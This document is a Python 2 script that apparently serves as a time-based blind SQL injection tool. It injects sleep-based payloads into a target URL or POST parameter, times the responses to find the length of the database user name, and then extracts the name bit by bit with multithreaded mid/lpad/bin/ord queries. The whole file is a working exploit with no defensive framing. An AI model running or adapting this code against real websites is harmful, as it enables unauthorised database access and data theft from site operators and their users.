#encoding:utf-8
import re
import urllib2
import urllib
import threading
import optparse
import sys
from lib.parser import parse
from lib.parser import format
def getlen(url,data=None,para=None):
    i=0
    if data==None:
        while True:
            print "[+] Checking: %s " %i
            payload = url+"'+or+sleep(if(length((select%20user()))="+ str(i) +",1,0))%23"
            #print payload
            html=httpres(payload)
            flag="timeout"
            if flag in html:
                print u"长度为:%s"%i
                return i
            i+=1
    else:
        while True:
            print "[+] Checking: %s " %i
            a=format(data) 
            a[para]=a[para]+"'or sleep(if(length((select user()))="+str(i)+",1,0))#" 
            post_data = urllib.urlencode(a) 
            #print payload
            html=httpres(url,post_data)
            flag="timeout"
            if flag in html:
                print u"长度为:%s"%i
                return i
            i+=1


def httpres(url,data=None):
    user_agent = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' } 
    conn = urllib2.Request(url, data, user_agent)
    try: 
        request = urllib2.urlopen(conn,timeout=2) 
    except Exception ,e: 
        return 'timeout'

    return request.read()

class MyThread(threading.Thread):
    def __init__(self,url,str,x,data=None,para=None):
        threading.Thread.__init__(self)
        self.url=url
        self.str=str
        self.x=x
        self.data=data
        self.para=para

    def run(self):
        global res #用来存二进制
        url=self.url
        j=self.str
        x=self.x
        para=self.para
        data=self.data
        if data==None:
            payload = url+"'or+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29," + str(x) + ",1%29%29%29,8,0%29,"+ str(j) + ",1%29%29,sleep%282%29,0%29%23"
            html=httpres(payload)
            flag="timeout"
            if flag in html:
                res[str(j)] = 1
            else:
                res[str(j)] = 0   
        else: 
            a=format(data)
            a[para]=a[para]+"'or if(1=(mid(lpad(bin(ord(mid((select user())," + str(x) + ",1))),8,0),"+ str(j) + ",1)),sleep(2),0)#"
            post_data = urllib.urlencode(a)
            html=httpres(url,post_data)
            flag="timeout"
            if flag in html:
                res[str(j)] = 1
            else:
                res[str(j)] = 0


def getData(url,Length,datapara=None,para=None):
    global res
    data=''

    for x in range(Length):
        x = x + 1
        threads = []
        for j in range(8):
            result = ""
            j = j + 1
            sb = MyThread(url,j,x,datapara,para)
            sb.setDaemon(True)
            threads.append(sb)
        for t in threads:
                t.start()
        for t in threads:
                t.join()
        tmp = ""
        for i in range(8):
            tmp = tmp + str(res[str(i+1)])
        result = chr(int(tmp,2))
        print result
        data = data + result
        sb = None
    print "[+] ok!"
    print "[+] result:" + data

if __name__=='__main__':
    res={}
    options = parse()
    leng=getlen(options.url,options.data,options.para)
    getData(options.url,leng,options.data,options.para)
